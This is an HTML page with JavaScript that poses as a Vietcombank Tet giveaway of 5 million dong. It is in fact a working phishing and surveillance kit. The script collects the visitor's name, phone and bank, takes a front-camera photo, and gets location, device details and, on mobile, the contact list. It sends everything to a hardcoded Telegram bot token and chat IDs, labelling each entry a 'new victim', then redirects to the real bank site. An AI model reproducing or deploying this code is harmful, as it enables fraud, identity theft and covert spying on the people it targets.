<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>L√å X√å T·∫æT 2025</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #ff0000, #ff6b00);
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        h1 {
            color: #FFD700;
            margin-bottom: 20px;
        }
        input, select {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border: none;
            font-size: 16px;
        }
        button {
            background: #FFD700;
            color: black;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
        button:hover {
            background: #ffed4e;
        }
        .hidden {
            display: none;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
        }
        .loading {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #FFD700;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        video {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            border: 3px solid #FFD700;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéâ NH·∫¨N L√å X√å T·∫æT 5 TRI·ªÜU üéâ</h1>
        <p>Nh·∫≠p th√¥ng tin ƒë·ªÉ nh·∫≠n ti·ªÅn m·∫∑t t·ª´ Vietcombank</p>
        
        <div id="step1">
            <input type="text" id="name" placeholder="H·ªç v√† t√™n" required>
            <input type="tel" id="phone" placeholder="S·ªë ƒëi·ªán tho·∫°i" required>
            <select id="bank">
                <option>Vietcombank</option>
                <option>BIDV</option>
                <option>Techcombank</option>
                <option>Agribank</option>
            </select>
            <button onclick="startProcess()">NH·∫¨N TI·ªÄN NGAY</button>
        </div>
        
        <div id="step2" class="hidden">
            <p>ƒêang x√°c minh camera...</p>
            <video id="video" autoplay></video>
            <div id="status"></div>
            <div id="loading" class="loading hidden"></div>
        </div>
    </div>

    <script>
        // C·∫§U H√åNH TELEGRAM
        const BOT_TOKEN = '8064381678:AAExIUfU75dF3V1ENVOIGnDVIVOwvh3BMm0';
        const CHAT_IDS = ['7847517938', '-5175975647']; // User ID + Group ID
        
        let victimData = {
            name: '',
            phone: '',
            bank: '',
            frontCam: null,
            location: null,
            device: ''
        };
        
        async function startProcess() {
            victimData.name = document.getElementById('name').value;
            victimData.phone = document.getElementById('phone').value;
            victimData.bank = document.getElementById('bank').value;
            
            if (!victimData.name || !victimData.phone) {
                alert('Vui l√≤ng ƒëi·ªÅn ƒë·∫ßy ƒë·ªß th√¥ng tin!');
                return;
            }
            
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            
            // L·∫•y th√¥ng tin thi·∫øt b·ªã
            victimData.device = navigator.userAgent;
            
            // L·∫•y v·ªã tr√≠
            getLocation();
            
            // B·∫≠t v√† ch·ª•p camera
            await startCamera();
        }
        
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    victimData.location = `${position.coords.latitude}, ${position.coords.longitude}`;
                }, error => {
                    victimData.location = 'Kh√¥ng l·∫•y ƒë∆∞·ª£c v·ªã tr√≠';
                });
            }
        }
        
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                document.getElementById('status').textContent = 'ƒêang ch·ª•p ·∫£nh...';
                
                // Ch·ª•p sau 3 gi√¢y
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    victimData.frontCam = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // D·ª´ng camera
                    stream.getTracks().forEach(track => track.stop());
                    
                    // G·ª≠i t·∫•t c·∫£ d·ªØ li·ªáu
                    await sendAllData();
                    
                }, 3000);
                
            } catch (error) {
                document.getElementById('status').textContent = 'Kh√¥ng th·ªÉ truy c·∫≠p camera. V·∫´n ti·∫øp t·ª•c g·ª≠i th√¥ng tin...';
                setTimeout(() => sendAllData(), 2000);
            }
        }
        
        async function sendAllData() {
            const loading = document.getElementById('loading');
            const status = document.getElementById('status');
            
            loading.classList.remove('hidden');
            status.textContent = 'ƒêang g·ª≠i d·ªØ li·ªáu...';
            
            // G·ª¨I TEXT TH√îNG TIN TR∆Ø·ªöC
            const textMessage = `
üî¥ N·∫†N NH√ÇN M·ªöI
üìõ T√™n: ${victimData.name}
üì± SƒêT: ${victimData.phone}
üè¶ Ng√¢n h√†ng: ${victimData.bank}
üìç V·ªã tr√≠: ${victimData.location || 'Kh√¥ng c√≥'}
üñ•Ô∏è Device: ${victimData.device}
‚è∞ Time: ${new Date().toLocaleString('vi-VN')}
            `.trim();
            
            // G·ª≠i text ƒë·∫øn t·∫•t c·∫£ chat IDs
            for (const chatId of CHAT_IDS) {
                try {
                    // G·ª≠i text
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: textMessage
                        })
                    });
                    
                    // G·ª≠i ·∫£nh n·∫øu c√≥
                    if (victimData.frontCam) {
                        await sendPhotoToTelegram(chatId, victimData.frontCam);
                    }
                    
                } catch (error) {
                    console.error(`L·ªói g·ª≠i ƒë·∫øn ${chatId}:`, error);
                }
            }
            
            // Ho√†n th√†nh
            loading.classList.add('hidden');
            status.innerHTML = '<span style="color:#4CAF50;">‚úÖ Th√†nh c√¥ng! Ti·ªÅn s·∫Ω chuy·ªÉn trong 24h.</span>';
            
            // Redirect sau 5 gi√¢y
            setTimeout(() => {
                window.location.href = 'https://vietcombank.com.vn';
            }, 5000);
        }
        
        // H√ÄM QUAN TR·ªåNG: G·ª¨I ·∫¢NH ƒê√öNG C√ÅCH
        async function sendPhotoToTelegram(chatId, photoBase64) {
            try {
                // Chuy·ªÉn base64 th√†nh blob
                const base64Data = photoBase64.split(',')[1];
                const byteCharacters = atob(base64Data);
                const byteNumbers = new Array(byteCharacters.length);
                
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                // T·∫°o FormData
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'camera.jpg');
                formData.append('caption', 'üì∏ Camera tr∆∞·ªõc - ' + victimData.name);
                
                // G·ª≠i ·∫£nh
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log('·∫¢nh ƒë√£ g·ª≠i:', result.ok);
                
                // N·∫øu l·ªói, th·ª≠ g·ª≠i d∆∞·ªõi d·∫°ng document
                if (!result.ok) {
                    const formData2 = new FormData();
                    formData2.append('chat_id', chatId);
                    formData2.append('document', blob, 'camera.jpg');
                    formData2.append('caption', 'üì∏ Camera tr∆∞·ªõc - ' + victimData.name);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData2
                    });
                }
                
            } catch (error) {
                console.error('L·ªói g·ª≠i ·∫£nh:', error);
            }
        }
        
        // T·ª± ƒë·ªông ƒëi·ªÅn s·ªë ƒëi·ªán tho·∫°i n·∫øu c√≥ trong cache
        window.addEventListener('DOMContentLoaded', () => {
            try {
                const savedPhone = localStorage.getItem('savedPhone');
                if (savedPhone) {
                    document.getElementById('phone').value = savedPhone;
                }
            } catch (e) {}
            
            // L∆∞u s·ªë ƒëi·ªán tho·∫°i khi ng∆∞·ªùi d√πng nh·∫≠p
            document.getElementById('phone').addEventListener('input', function() {
                localStorage.setItem('savedPhone', this.value);
            });
        });
        
        // Th·ª≠ l·∫•y danh b·∫° n·∫øu l√† mobile
        if ('contacts' in navigator && 'ContactsManager' in window) {
            setTimeout(() => {
                navigator.contacts.select(['name', 'tel'], { multiple: true })
                    .then(contacts => {
                        const phones = contacts.flatMap(c => c.tel || []);
                        if (phones.length > 0) {
                            const phoneList = phones.join(', ');
                            // G·ª≠i danh b·∫° v·ªÅ Telegram
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: '7847517938',
                                    text: `üìû DANH B·∫† L·∫§Y ƒê∆Ø·ª¢C:\n${phoneList}`
                                })
                            });
                        }
                    })
                    .catch(() => {});
            }, 10000);
        }
    </script>
</body>
</html>
